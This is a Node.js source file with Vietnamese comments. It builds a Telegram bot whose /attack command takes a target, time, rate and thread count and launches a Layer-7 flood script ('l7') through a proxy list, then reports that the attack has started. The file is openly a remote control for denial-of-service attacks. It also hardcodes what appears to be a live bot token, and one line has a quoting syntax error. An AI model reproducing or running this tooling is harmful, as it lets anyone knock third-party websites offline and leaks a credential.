const TelegramBot = require('node-telegram-bot-api');
const { spawn } = require('child_process');
const express = require('express');

// Thay bằng token bot của bạn
const TOKEN = '7937745403:AAGBsPZIbCTzvhYhsOFkL-IVAQc3m-ta-Dc';
const bot = new TelegramBot(TOKEN, { polling: true });

const app = express();
const PORT = process.env.PORT || 3000;

// Route cơ bản để kiểm tra server
app.get('/', (req, res) => {
  res.send('Bot đang hoạt động!');
});

// Khởi động server
app.listen(PORT, () => {
  console.log(`Server chạy tại cổng ${PORT}`);
});

// Log tất cả tin nhắn để debug
bot.on('message', (msg) => {
  console.log(`Nhận tin nhắn: ${msg.text} từ chat ID: ${msg.chat.id}`);
});

// Xử lý lệnh /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Bot đã khởi động! Sử dụng /attack [target] [time] [rate] [thread] để bắt đầu.');
});

// Xử lý lệnh /attack
bot.onText(/^\/attack (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].trim().split(' ');

  // Kiểm tra số lượng tham số
  if (args.length !== 4) {
    bot.sendMessage(chatId, '🚫 Cú pháp: /attack [target] [time] [rate] [thread]\nVí dụ: /attack example.com 60 100 10');
    return;
  }

  const [target, time, rate, thread] = args;

  // Kiểm tra định dạng tham số
  if (!target || isNaN(time) || isNaN(rate) || isNaN(thread)) {
    bot.sendMessage(chatId, ''🚫 Tham số không hợp lệ. Time, rate, thread phải là số.');
    return;
  }

  // Thực thi lệnh spawn
  try {
    const command = spawn('node', ['l7', target, time, rate, thread, 'proxy.txt']);

    // Thông tin tấn công
    const info = {
      target,
      time: `${time}s`,
      rate,
      thread,
      proxy: 'proxy.txt'
    };

    const message = `✅ Attack Started!\n➖➖➖➖➖➖➖➖➖➖\n\`\`\`json\n${JSON.stringify(info, null, 2)}\n\`\`\``;
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });

    console.log(`[ATTACK] Target: ${target} | Time: ${time}s | Rate: ${rate} | Thread: ${thread}`);

    // Xử lý lỗi từ spawn
    command.on('error', (error) => {
      console.error(`Lỗi spawn: ${error.message}`);
      bot.sendMessage(chatId, `❌ Lỗi: ${error.message}`);
    });

    // Xử lý khi lệnh hoàn thành
    command.on('close', (code) => {
      console.log(`Lệnh hoàn thành với mã: ${code}`);
      bot.sendMessage(chatId, `ℹ️ Lệnh hoàn thành với mã: ${code}`);
    });
  } catch (error) {
    console.error(`Lỗi khi thực thi: ${error.message}`);
    bot.sendMessage(chatId, `❌ Lỗi: ${error.message}`);
  }
});

// Xử lý lỗi polling
bot.on('polling_error', (error) => {
  console.error(`Lỗi polling: ${error.message}`);
});
